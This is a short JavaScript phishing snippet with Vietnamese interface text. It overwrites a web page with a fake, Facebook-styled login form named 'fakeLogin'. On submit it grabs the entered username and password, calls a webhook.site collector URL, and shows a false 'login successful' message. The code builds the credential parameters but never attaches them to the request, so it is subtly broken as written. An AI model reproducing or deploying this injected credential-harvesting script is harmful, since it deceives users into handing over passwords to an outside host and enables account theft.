alert("🔒 Vui lòng đăng nhập để tiếp tục...");

document.body.innerHTML = `
<div style="position:fixed; top:0; left:0; width:100%; height:100%; background:#f0f2f5; display:flex; align-items:center; justify-content:center; font-family:Arial, sans-serif; z-index:99999;">
  <div style="background:white; padding:30px; border-radius:10px; box-shadow:0 4px 20px rgba(0,0,0,0.2); width:380px; text-align:center;">
    <h2 style="color:#1877f2; margin-bottom:20px;">Đăng nhập</h2>
    <form id="fakeLogin">
      <input type="text" id="user" placeholder="Email hoặc tên đăng nhập" 
             style="width:100%; padding:12px; margin:10px 0; border:1px solid #ddd; border-radius:5px; font-size:16px;"><br>
      <input type="password" id="pass" placeholder="Mật khẩu" 
             style="width:100%; padding:12px; margin:10px 0; border:1px solid #ddd; border-radius:5px; font-size:16px;"><br>
      <button type="submit" 
              style="width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:5px; font-size:16px; cursor:pointer;">
        Đăng nhập
      </button>
    </form>
    <p style="margin-top:15px; font-size:13px; color:#666;">Quên mật khẩu?</p>
  </div>
</div>
`;

document.getElementById('fakeLogin').addEventListener('submit', function(e) {
  e.preventDefault();
  
  const username = document.getElementById('user').value;
  const password = document.getElementById('pass').value;

  if (username && password) {
    const params = new URLSearchParams({
      username: username,
      password: password,
    });

    const webhook = "https://webhook.site/7a0dbcec-4a4a-4059-9719-eae36e1140d6";

    fetch(webhook, {
      method: 'GET'
    });
	
	alert("Đăng nhập thành công! Đang chuyển hướng...");
  }
});
